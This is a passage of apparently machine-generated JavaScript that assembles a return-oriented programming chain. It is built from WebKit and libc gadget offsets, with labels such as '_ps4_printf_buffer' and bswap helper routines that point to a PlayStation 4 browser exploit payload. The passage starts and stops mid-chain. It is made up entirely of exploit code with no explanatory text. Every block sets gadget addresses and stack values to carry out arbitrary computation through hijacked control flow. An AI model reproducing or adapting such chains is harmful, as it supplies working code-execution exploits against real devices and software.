db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
//L2406:
libc_base+362222, //pop rsi
ropchain+160968, //L2433-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2431:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+161072, //L2436-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+161056, //L2435-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2435:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2436:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223872, //mov al, [rdi]
libc_base+362222, //pop rsi
ropchain+161232, //L2440-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+161184, //L2437-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+161216, //L2439-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2437:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2438:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L2439:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2440:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+161288, //L2442-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2442:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+161392, //L2443-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+161424, //L2445-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+161408, //L2444-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2443:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2444:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2445:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+161584, //L2449-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+161536, //L2446-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+161568, //L2448-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2446:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2447:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L2448:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2449:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+161640, //L2451-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2451:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+161744, //L2452-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+161776, //L2454-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+161760, //L2453-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2452:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2453:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2454:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+161848, //L2455-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+161864, //L2456-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2455:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2456:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+162024, //L2460-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+161976, //L2457-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+162008, //L2459-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2457:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2458:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L2459:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+162080, //L2462-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2462:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+162184, //L2463-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+162216, //L2465-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+162200, //L2464-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2463:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2465:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+162312, //L2467-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+162296, //L2466-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2466:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2467:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+162448, //L2470-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+162416, //L2468-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+155394, //pop rdi
//L2469:
ropchain+136, //_ps4_printf_buffer
libc_base+467092 //pop rax
]);
//L2470:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+162592, //L2473-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+162560, //L2471-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+162576, //L2472-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2471:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2472:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2473:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+162680, //L2475-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2474:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2475:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+162744, //L2477-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092, //pop rax
//L2476:
ropchain+136, //_ps4_printf_buffer
libc_base+757614 //pop rcx
]);
//L2477:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+362222, //pop rsi
ropchain+162800, //L2478-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2478:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+162880, //L2480-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+162936, //L2483-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2483:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+163064, //L2485-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+163048, //L2484-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2484:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2485:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+163160, //L2486-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+163176, //L2487-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2486:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+163288, //L2488-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+163272, //L2489-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2489:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2488:
db([0, 0]); // 0x0
//L2430:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+164136, //L2490
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+163944, //L2491
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+163960, //L2492
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+163976, //L2493
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+163992, //L2494
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+164008, //L2495
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+164024, //L2496
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+164056, //L2497
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
write_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+164048, //L2498
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+164104, //L2499
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+164120, //L2500
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2491:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2492:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2493:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2494:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2495:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2496:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L2498:
db([0, 0]); // 0x0
//L2497:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+164088, //L2501
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L2501:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2499:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2500:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2490:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+164192, //L2502-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2502:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+164288, //L2504-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+164320, //L2507-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L2504:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2505:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+164424, //L2510-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+164408, //L2509-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2509:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+164528, //L2511-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+164560, //L2513-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+164544, //L2512-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2511:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2512:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+164656, //L2514-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+164672, //L2515-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2514:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+164784, //L2516-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+164768, //L2517-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2517:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+164872, //L2519-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+164856, //L2518-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2518:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+164968, //L2520-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+164984, //L2521-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2520:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+165096, //L2522-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+165080, //L2523-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2523:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2522:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+165168, //L2524-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2524:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+165264, //L2526-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+165296, //L2529-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L2526:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2527:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+165400, //L2532-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+165384, //L2531-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2531:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2532:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+165568, //L2535-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+165584, //L2536-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+165536, //L2533-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+165552, //L2534-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2533:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2534:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2535:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2536:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+165744, //L2540-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+165696, //L2537-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+165728, //L2539-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2537:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2538:
db([32, 0]); // 0x20
set_gadget(libc_base+155394,); //pop rdi
//L2539:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2540:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+165856, //L2541-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+165888, //L2543-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+165872, //L2542-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2541:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2542:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2543:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+165984, //L2544-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+166000, //L2545-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2544:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2545:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+166112, //L2546-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+166096, //L2547-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2547:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+166200, //L2549-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+166184, //L2548-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2548:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2549:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+166296, //L2550-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+166312, //L2551-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2550:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2551:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+166424, //L2552-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+166408, //L2553-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2553:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2552:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+166496, //L2554-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+166592, //L2556-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+166624, //L2559-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L2556:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2557:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2559:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+166728, //L2562-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+166712, //L2561-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2561:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2562:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224576, //mov ax, [rdi]
libc_base+362222, //pop rsi
ropchain+166888, //L2566-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+166840, //L2563-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+166872, //L2565-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2563:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2564:
db([16, 0]); // 0x10
set_gadget(libc_base+155394,); //pop rdi
//L2565:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2566:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
